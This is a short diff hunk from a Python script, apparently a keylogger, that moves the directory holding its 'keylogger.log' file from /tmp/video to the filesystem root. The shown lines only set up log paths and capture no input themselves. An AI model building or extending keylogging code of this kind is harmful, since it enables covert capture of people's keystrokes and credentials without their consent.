@@ -5,7 +5,7 @@ import re, os, pyautogui as py
 
 dataAtual = datetime.now()
 data = dataAtual.strftime("%d-%m")
-diretorioRaiz = "/tmp/video/keylogger_" + data + "/"
+diretorioRaiz = "/keylogger_" + data + "/"
 arquivoLog = diretorioRaiz + "keylogger.log"
 
 try:
